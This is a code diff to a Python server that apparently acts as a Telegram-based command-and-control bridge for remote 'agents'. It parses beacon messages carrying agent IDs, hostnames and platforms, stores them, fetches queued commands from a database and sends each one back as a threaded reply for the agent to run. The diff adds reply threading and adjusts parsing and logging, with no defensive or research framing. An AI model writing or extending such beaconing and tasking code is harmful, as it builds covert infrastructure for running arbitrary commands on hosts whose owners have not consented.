@@ -105,7 +105,7 @@ def add_task_to_db(agent_id, task_type, command):
         print(f"[TG-DB-ERROR] {e}")
         return None
 
-def send_message(text, chat_id=None, parse_mode="HTML"):
+def send_message(text, chat_id=None, parse_mode="HTML", reply_to=None):
     """Send message via Telegram API."""
     url = f"{API_BASE}/sendMessage"
     data = {
@@ -113,6 +113,8 @@ def send_message(text, chat_id=None, parse_mode="HTML"):
         "text": text[:4000],
         "parse_mode": parse_mode
     }
+    if reply_to:
+        data["reply_to_message_id"] = reply_to
     try:
         resp = requests.post(url, json=data, timeout=10)
         return resp.json()
@@ -386,14 +388,13 @@ def handle_agent_message(message):
 def handle_agent_beacon(message):
     """Handle beacon messages from agents - Telegram Bridge.
     
-    When agent sends beacon, check DB for pending tasks and reply with commands.
-    Agent will poll replies and execute.
+    Reply to beacon with commands from DB.
     """
     text = message.get("text", "")
     chat_id = message["chat"]["id"]
+    msg_id = message.get("message_id", 0)
     
     # Extract agent ID from beacon
-    # Format: "📡 Beacon #N\n\nAgent: xxx\nHostname: xxx\nPlatform: xxx"
     agent_id = None
     hostname = "unknown"
     platform = "unknown"
@@ -404,7 +405,7 @@ def handle_agent_beacon(message):
         agent_id = id_match.group(1)
     
     # Extract hostname
-    host_match = re.search(r'Hostname[:\s]+([^\n]+)', text, re.IGNORECASE)
+    host_match = re.search(r'Host[:\s]+([^\n]+)', text, re.IGNORECASE)
     if host_match:
         hostname = host_match.group(1).strip()
     
@@ -419,12 +420,13 @@ def handle_agent_beacon(message):
             "chat_id": chat_id,
             "platform": platform,
             "hostname": hostname,
-            "last_seen": datetime.now().isoformat()
+            "last_seen": datetime.now().isoformat(),
+            "msg_id": msg_id
         }
         
         # Update database
         save_agent_to_db(agent_id, hostname, platform)
-        print(f"[TG-BRIDGE] Agent {agent_id[:8]} beacon received")
+        print(f"[TG-BRIDGE] Agent {agent_id[:8]} beacon (msg={msg_id})")
         
         # Get pending commands for this agent
         try:
@@ -442,24 +444,19 @@ def handle_agent_beacon(message):
             tasks = db.fetchall()
             
             if tasks:
-                # Send commands as reply (agent will poll this)
+                # Reply to beacon with commands
                 for task in tasks:
                     task_id, task_type, command = task
                     
-                    # Send in format agent expects
-                    cmd_msg = f"""📋 <b>Task #{task_id}</b>
-Type: {task_type}
-Command: {command}"""
-                    send_message(cmd_msg, CHAT_ID)
+                    # Reply to beacon message
+                    cmd_msg = f"📋 Task #{task_id}\nType: {task_type}\nCommand: {command}"
+                    send_message(cmd_msg, CHAT_ID, reply_to=msg_id)
                     
                     # Mark as sent
                     db.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task_id,))
                 
                 conn.commit()
-                print(f"[TG-BRIDGE] Sent {len(tasks)} tasks to {agent_id[:8]}")
-            else:
-                # No pending tasks - send ack
-                print(f"[TG-BRIDGE] No pending tasks for {agent_id[:8]}")
+                print(f"[TG-BRIDGE] Replied with {len(tasks)} tasks")
             
             conn.close()
         except Exception as e:
